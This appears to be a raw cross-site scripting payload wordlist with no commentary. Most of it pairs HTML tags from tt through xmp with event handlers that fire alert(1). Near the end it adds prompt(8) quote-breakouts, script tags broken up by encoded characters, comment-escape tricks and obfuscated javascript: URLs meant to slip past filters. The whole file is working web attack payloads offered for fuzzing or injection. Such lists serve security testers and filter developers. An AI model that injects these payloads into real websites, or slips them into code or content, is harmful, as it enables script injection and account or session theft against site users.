<tt id=x tabindex=1 onfocusin=alert(1)></tt>
<tt onafterscriptexecute=alert(1)><script>1</script>
<tt onbeforecopy="alert(1)" contenteditable>test</tt>
<tt onbeforecut="alert(1)" contenteditable>test</tt>
<tt onbeforescriptexecute=alert(1)><script>1</script>
<tt onblur=alert(1) id=x tabindex=1 style=display:block>test</tt><input value=clickme>
<tt onclick="alert(1)" style=display:block>test</tt>
<tt oncontextmenu="alert(1)" style=display:block>test</tt>
<tt oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tt oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<tt ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</tt>
<tt onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</tt><input value=clickme>
<tt onkeydown="alert(1)" contenteditable style=display:block>test</tt>
<tt onkeypress="alert(1)" contenteditable style=display:block>test</tt>
<tt onkeyup="alert(1)" contenteditable style=display:block>test</tt>
<tt onmousedown="alert(1)" style=display:block>test</tt>
<tt onmouseenter="alert(1)" style=display:block>test</tt>
<tt onmouseleave="alert(1)" style=display:block>test</tt>
<tt onmousemove="alert(1)" style=display:block>test</tt>
<tt onmouseout="alert(1)" style=display:block>test</tt>
<tt onmouseover="alert(1)" style=display:block>test</tt>
<tt onmouseup="alert(1)" style=display:block>test</tt>
<tt onmousewheel=alert(1) style=display:block>requires scrolling
<tt onpaste="alert(1)" contenteditable>test</tt>
<tt onpointerdown=alert(1) style=display:block>XSS</tt>
<tt onpointerenter=alert(1) style=display:block>XSS</tt>
<tt onpointerleave=alert(1) style=display:block>XSS</tt>
<tt onpointermove=alert(1) style=display:block>XSS</tt>
<tt onpointerout=alert(1) style=display:block>XSS</tt>
<tt onpointerover=alert(1) style=display:block>XSS</tt>
<tt onpointerrawupdate=alert(1) style=display:block>XSS</tt>
<tt onpointerup=alert(1) style=display:block>XSS</tt>
<tt onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></tt>
<u contenteditable onbeforeinput=alert(1)>test
<u draggable="true" ondrag="alert(1)" style=display:block>test</u>
<u draggable="true" ondragend="alert(1)" style=display:block>test</u>
<u draggable="true" ondragenter="alert(1)" style=display:block>test</u>
<u draggable="true" ondragleave="alert(1)" style=display:block>test</u>
<u draggable="true" ondragstart="alert(1)" style=display:block>test</u>
<u id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></u>
<u id=x tabindex=1 onfocus=alert(1)></u>
<u id=x tabindex=1 onfocusin=alert(1)></u>
<u onafterscriptexecute=alert(1)><script>1</script>
<u onbeforecopy="alert(1)" contenteditable>test</u>
<u onbeforecut="alert(1)" contenteditable>test</u>
<u onbeforescriptexecute=alert(1)><script>1</script>
<u onblur=alert(1) id=x tabindex=1 style=display:block>test</u><input value=clickme>
<u onclick="alert(1)" style=display:block>test</u>
<u oncontextmenu="alert(1)" style=display:block>test</u>
<u oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<u oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<u ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</u>
<u onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</u><input value=clickme>
<u onkeydown="alert(1)" contenteditable style=display:block>test</u>
<u onkeypress="alert(1)" contenteditable style=display:block>test</u>
<u onkeyup="alert(1)" contenteditable style=display:block>test</u>
<u onmousedown="alert(1)" style=display:block>test</u>
<u onmouseenter="alert(1)" style=display:block>test</u>
<u onmouseleave="alert(1)" style=display:block>test</u>
<u onmousemove="alert(1)" style=display:block>test</u>
<u onmouseout="alert(1)" style=display:block>test</u>
<u onmouseover="alert(1)" style=display:block>test</u>
<u onmouseup="alert(1)" style=display:block>test</u>
<u onmousewheel=alert(1) style=display:block>requires scrolling
<u onpaste="alert(1)" contenteditable>test</u>
<u onpointerdown=alert(1) style=display:block>XSS</u>
<u onpointerenter=alert(1) style=display:block>XSS</u>
<u onpointerleave=alert(1) style=display:block>XSS</u>
<u onpointermove=alert(1) style=display:block>XSS</u>
<u onpointerout=alert(1) style=display:block>XSS</u>
<u onpointerover=alert(1) style=display:block>XSS</u>
<u onpointerrawupdate=alert(1) style=display:block>XSS</u>
<u onpointerup=alert(1) style=display:block>XSS</u>
<u onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></u>
<ul contenteditable onbeforeinput=alert(1)>test
<ul draggable="true" ondrag="alert(1)" style=display:block>test</ul>
<ul draggable="true" ondragend="alert(1)" style=display:block>test</ul>
<ul draggable="true" ondragenter="alert(1)" style=display:block>test</ul>
<ul draggable="true" ondragleave="alert(1)" style=display:block>test</ul>
<ul draggable="true" ondragstart="alert(1)" style=display:block>test</ul>
<ul id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></ul>
<ul id=x tabindex=1 onfocus=alert(1)></ul>
<ul id=x tabindex=1 onfocusin=alert(1)></ul>
<ul onafterscriptexecute=alert(1)><script>1</script>
<ul onbeforecopy="alert(1)" contenteditable>test</ul>
<ul onbeforecut="alert(1)" contenteditable>test</ul>
<ul onbeforescriptexecute=alert(1)><script>1</script>
<ul onblur=alert(1) id=x tabindex=1 style=display:block>test</ul><input value=clickme>
<ul onclick="alert(1)" style=display:block>test</ul>
<ul oncontextmenu="alert(1)" style=display:block>test</ul>
<ul oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ul oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ul ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</ul>
<ul onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</ul><input value=clickme>
<ul onkeydown="alert(1)" contenteditable style=display:block>test</ul>
<ul onkeypress="alert(1)" contenteditable style=display:block>test</ul>
<ul onkeyup="alert(1)" contenteditable style=display:block>test</ul>
<ul onmousedown="alert(1)" style=display:block>test</ul>
<ul onmouseenter="alert(1)" style=display:block>test</ul>
<ul onmouseleave="alert(1)" style=display:block>test</ul>
<ul onmousemove="alert(1)" style=display:block>test</ul>
<ul onmouseout="alert(1)" style=display:block>test</ul>
<ul onmouseover="alert(1)" style=display:block>test</ul>
<ul onmouseup="alert(1)" style=display:block>test</ul>
<ul onmousewheel=alert(1) style=display:block>requires scrolling
<ul onpaste="alert(1)" contenteditable>test</ul>
<ul onpointerdown=alert(1) style=display:block>XSS</ul>
<ul onpointerenter=alert(1) style=display:block>XSS</ul>
<ul onpointerleave=alert(1) style=display:block>XSS</ul>
<ul onpointermove=alert(1) style=display:block>XSS</ul>
<ul onpointerout=alert(1) style=display:block>XSS</ul>
<ul onpointerover=alert(1) style=display:block>XSS</ul>
<ul onpointerrawupdate=alert(1) style=display:block>XSS</ul>
<ul onpointerup=alert(1) style=display:block>XSS</ul>
<ul onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></ul>
<var contenteditable onbeforeinput=alert(1)>test
<var draggable="true" ondrag="alert(1)" style=display:block>test</var>
<var draggable="true" ondragend="alert(1)" style=display:block>test</var>
<var draggable="true" ondragenter="alert(1)" style=display:block>test</var>
<var draggable="true" ondragleave="alert(1)" style=display:block>test</var>
<var draggable="true" ondragstart="alert(1)" style=display:block>test</var>
<var id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></var>
<var id=x tabindex=1 onfocus=alert(1)></var>
<var id=x tabindex=1 onfocusin=alert(1)></var>
<var onafterscriptexecute=alert(1)><script>1</script>
<var onbeforecopy="alert(1)" contenteditable>test</var>
<var onbeforecut="alert(1)" contenteditable>test</var>
<var onbeforescriptexecute=alert(1)><script>1</script>
<var onblur=alert(1) id=x tabindex=1 style=display:block>test</var><input value=clickme>
<var onclick="alert(1)" style=display:block>test</var>
<var oncontextmenu="alert(1)" style=display:block>test</var>
<var oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<var oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<var ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</var>
<var onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</var><input value=clickme>
<var onkeydown="alert(1)" contenteditable style=display:block>test</var>
<var onkeypress="alert(1)" contenteditable style=display:block>test</var>
<var onkeyup="alert(1)" contenteditable style=display:block>test</var>
<var onmousedown="alert(1)" style=display:block>test</var>
<var onmouseenter="alert(1)" style=display:block>test</var>
<var onmouseleave="alert(1)" style=display:block>test</var>
<var onmousemove="alert(1)" style=display:block>test</var>
<var onmouseout="alert(1)" style=display:block>test</var>
<var onmouseover="alert(1)" style=display:block>test</var>
<var onmouseup="alert(1)" style=display:block>test</var>
<var onmousewheel=alert(1) style=display:block>requires scrolling
<var onpaste="alert(1)" contenteditable>test</var>
<var onpointerdown=alert(1) style=display:block>XSS</var>
<var onpointerenter=alert(1) style=display:block>XSS</var>
<var onpointerleave=alert(1) style=display:block>XSS</var>
<var onpointermove=alert(1) style=display:block>XSS</var>
<var onpointerout=alert(1) style=display:block>XSS</var>
<var onpointerover=alert(1) style=display:block>XSS</var>
<var onpointerrawupdate=alert(1) style=display:block>XSS</var>
<var onpointerup=alert(1) style=display:block>XSS</var>
<var onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></var>
<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video contenteditable onbeforeinput=alert(1)>test
<video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video controls autoplay onratechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
<video controls onprogress=alert(1)><source src=validvideo.mp4 type=video/mp4></video>
<video controls src=1 onfocus=alert(1) autofocus>
<video controls src=1 onfocusin=alert(1) autofocus>
<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE

1
00:00:00.000 --> 00:00:05.000 
<b>XSS</b>
"></video>
<video draggable="true" ondrag="alert(1)" style=display:block>test</video>
<video draggable="true" ondragend="alert(1)" style=display:block>test</video>
<video draggable="true" ondragenter="alert(1)" style=display:block>test</video>
<video draggable="true" ondragleave="alert(1)" style=display:block>test</video>
<video draggable="true" ondragstart="alert(1)" style=display:block>test</video>
<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
<video id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></video>
<video onafterscriptexecute=alert(1)><script>1</script>
<video onbeforecopy="alert(1)" contenteditable>test</video>
<video onbeforecut="alert(1)" contenteditable>test</video>
<video onbeforescriptexecute=alert(1)><script>1</script>
<video onblur=alert(1) id=x tabindex=1 style=display:block>test</video><input value=clickme>
<video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video onclick="alert(1)" style=display:block>test</video>
<video oncontextmenu="alert(1)" style=display:block>test</video>
<video oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<video oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<video ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</video>
<video onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</video><input value=clickme>
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
<video onkeydown="alert(1)" contenteditable style=display:block>test</video>
<video onkeypress="alert(1)" contenteditable style=display:block>test</video>
<video onkeyup="alert(1)" contenteditable style=display:block>test</video>
<video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
<video onmousedown="alert(1)" style=display:block>test</video>
<video onmouseenter="alert(1)" style=display:block>test</video>
<video onmouseleave="alert(1)" style=display:block>test</video>
<video onmousemove="alert(1)" style=display:block>test</video>
<video onmouseout="alert(1)" style=display:block>test</video>
<video onmouseover="alert(1)" style=display:block>test</video>
<video onmouseup="alert(1)" style=display:block>test</video>
<video onmousewheel=alert(1) style=display:block>requires scrolling
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
<video onpaste="alert(1)" contenteditable>test</video>
<video onpointerdown=alert(1) style=display:block>XSS</video>
<video onpointerenter=alert(1) style=display:block>XSS</video>
<video onpointerleave=alert(1) style=display:block>XSS</video>
<video onpointermove=alert(1) style=display:block>XSS</video>
<video onpointerout=alert(1) style=display:block>XSS</video>
<video onpointerover=alert(1) style=display:block>XSS</video>
<video onpointerrawupdate=alert(1) style=display:block>XSS</video>
<video onpointerup=alert(1) style=display:block>XSS</video>
<video onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></video>
<video src/onerror=alert(1)>
<video2 contenteditable onbeforeinput=alert(1)>test
<video2 draggable="true" ondrag="alert(1)" style=display:block>test</video2>
<video2 draggable="true" ondragend="alert(1)" style=display:block>test</video2>
<video2 draggable="true" ondragenter="alert(1)" style=display:block>test</video2>
<video2 draggable="true" ondragleave="alert(1)" style=display:block>test</video2>
<video2 draggable="true" ondragstart="alert(1)" style=display:block>test</video2>
<video2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></video2>
<video2 onafterscriptexecute=alert(1)><script>1</script>
<video2 onbeforescriptexecute=alert(1)><script>1</script>
<video2 onblur=alert(1) id=x tabindex=1 style=display:block>test</video2><input value=clickme>
<video2 onclick="alert(1)" style=display:block>test</video2>
<video2 oncontextmenu="alert(1)" style=display:block>test</video2>
<video2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<video2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<video2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</video2>
<video2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</video2><input value=clickme>
<video2 onkeydown="alert(1)" contenteditable style=display:block>test</video2>
<video2 onkeypress="alert(1)" contenteditable style=display:block>test</video2>
<video2 onkeyup="alert(1)" contenteditable style=display:block>test</video2>
<video2 onmousedown="alert(1)" style=display:block>test</video2>
<video2 onmouseenter="alert(1)" style=display:block>test</video2>
<video2 onmouseleave="alert(1)" style=display:block>test</video2>
<video2 onmousemove="alert(1)" style=display:block>test</video2>
<video2 onmouseout="alert(1)" style=display:block>test</video2>
<video2 onmouseover="alert(1)" style=display:block>test</video2>
<video2 onmouseup="alert(1)" style=display:block>test</video2>
<video2 onmousewheel=alert(1) style=display:block>requires scrolling
<video2 onpointerdown=alert(1) style=display:block>XSS</video2>
<video2 onpointerenter=alert(1) style=display:block>XSS</video2>
<video2 onpointerleave=alert(1) style=display:block>XSS</video2>
<video2 onpointermove=alert(1) style=display:block>XSS</video2>
<video2 onpointerout=alert(1) style=display:block>XSS</video2>
<video2 onpointerover=alert(1) style=display:block>XSS</video2>
<video2 onpointerrawupdate=alert(1) style=display:block>XSS</video2>
<video2 onpointerup=alert(1) style=display:block>XSS</video2>
<video2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></video2>
<video><source onerror=alert(1) src=1></video>
<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
<wbr contenteditable onbeforeinput=alert(1)>test
<wbr draggable="true" ondrag="alert(1)" style=display:block>test</wbr>
<wbr draggable="true" ondragend="alert(1)" style=display:block>test</wbr>
<wbr draggable="true" ondragenter="alert(1)" style=display:block>test</wbr>
<wbr draggable="true" ondragleave="alert(1)" style=display:block>test</wbr>
<wbr draggable="true" ondragstart="alert(1)" style=display:block>test</wbr>
<wbr id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></wbr>
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
<wbr onafterscriptexecute=alert(1)><script>1</script>
<wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
<wbr onbeforecut="alert(1)" contenteditable>test</wbr>
<wbr onbeforescriptexecute=alert(1)><script>1</script>
<wbr onblur=alert(1) id=x tabindex=1 style=display:block>test</wbr><input value=clickme>
<wbr onclick="alert(1)" style=display:block>test</wbr>
<wbr oncontextmenu="alert(1)" style=display:block>test</wbr>
<wbr oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<wbr oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<wbr ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</wbr>
<wbr onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</wbr><input value=clickme>
<wbr onkeydown="alert(1)" contenteditable style=display:block>test</wbr>
<wbr onkeypress="alert(1)" contenteditable style=display:block>test</wbr>
<wbr onkeyup="alert(1)" contenteditable style=display:block>test</wbr>
<wbr onmousedown="alert(1)" style=display:block>test</wbr>
<wbr onmouseenter="alert(1)" style=display:block>test</wbr>
<wbr onmouseleave="alert(1)" style=display:block>test</wbr>
<wbr onmousemove="alert(1)" style=display:block>test</wbr>
<wbr onmouseout="alert(1)" style=display:block>test</wbr>
<wbr onmouseover="alert(1)" style=display:block>test</wbr>
<wbr onmouseup="alert(1)" style=display:block>test</wbr>
<wbr onmousewheel=alert(1) style=display:block>requires scrolling
<wbr onpaste="alert(1)" contenteditable>test</wbr>
<wbr onpointerdown=alert(1) style=display:block>XSS</wbr>
<wbr onpointerenter=alert(1) style=display:block>XSS</wbr>
<wbr onpointerleave=alert(1) style=display:block>XSS</wbr>
<wbr onpointermove=alert(1) style=display:block>XSS</wbr>
<wbr onpointerout=alert(1) style=display:block>XSS</wbr>
<wbr onpointerover=alert(1) style=display:block>XSS</wbr>
<wbr onpointerrawupdate=alert(1) style=display:block>XSS</wbr>
<wbr onpointerup=alert(1) style=display:block>XSS</wbr>
<wbr onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></wbr>
<xmp contenteditable onbeforeinput=alert(1)>test
<xmp draggable="true" ondrag="alert(1)" style=display:block>test</xmp>
<xmp draggable="true" ondragend="alert(1)" style=display:block>test</xmp>
<xmp draggable="true" ondragenter="alert(1)" style=display:block>test</xmp>
<xmp draggable="true" ondragleave="alert(1)" style=display:block>test</xmp>
<xmp draggable="true" ondragstart="alert(1)" style=display:block>test</xmp>
<xmp id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xmp>
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
<xmp onafterscriptexecute=alert(1)><script>1</script>
<xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
<xmp onbeforecut="alert(1)" contenteditable>test</xmp>
<xmp onbeforescriptexecute=alert(1)><script>1</script>
<xmp onblur=alert(1) id=x tabindex=1 style=display:block>test</xmp><input value=clickme>
<xmp onclick="alert(1)" style=display:block>test</xmp>
<xmp oncontextmenu="alert(1)" style=display:block>test</xmp>
<xmp oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<xmp oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<xmp ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xmp>
<xmp onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xmp><input value=clickme>
<xmp onkeydown="alert(1)" contenteditable style=display:block>test</xmp>
<xmp onkeypress="alert(1)" contenteditable style=display:block>test</xmp>
<xmp onkeyup="alert(1)" contenteditable style=display:block>test</xmp>
<xmp onmousedown="alert(1)" style=display:block>test</xmp>
<xmp onmouseenter="alert(1)" style=display:block>test</xmp>
<xmp onmouseleave="alert(1)" style=display:block>test</xmp>
<xmp onmousemove="alert(1)" style=display:block>test</xmp>
<xmp onmouseout="alert(1)" style=display:block>test</xmp>
<xmp onmouseover="alert(1)" style=display:block>test</xmp>
<xmp onmouseup="alert(1)" style=display:block>test</xmp>
<xmp onmousewheel=alert(1) style=display:block>requires scrolling
<xmp onpaste="alert(1)" contenteditable>test</xmp>
<xmp onpointerdown=alert(1) style=display:block>XSS</xmp>
<xmp onpointerenter=alert(1) style=display:block>XSS</xmp>
<xmp onpointerleave=alert(1) style=display:block>XSS</xmp>
<xmp onpointermove=alert(1) style=display:block>XSS</xmp>
<xmp onpointerout=alert(1) style=display:block>XSS</xmp>
<xmp onpointerover=alert(1) style=display:block>XSS</xmp>
<xmp onpointerrawupdate=alert(1) style=display:block>XSS</xmp>
<xmp onpointerup=alert(1) style=display:block>XSS</xmp>
<xmp onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xmp>
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
<xss autofocus tabindex=1 onfocusin=alert(1)></xss>
"-prompt(8)-"
'-prompt(8)-'
";a=prompt,a()//
';a=prompt,a()//
'-eval("window['pro'%2B'mpt'](8)")-'
"-eval("window['pro'%2B'mpt'](8)")-"
"onclick=prompt(8)>"@x.y
"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
<image/src/onerror=prompt(8)>
<img/src/onerror=prompt(8)>
<image src/onerror=prompt(8)>
<img src/onerror=prompt(8)>
<image src =q onerror=prompt(8)>
<img src =q onerror=prompt(8)>
</scrip</script>t><img src =q onerror=prompt(8)>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
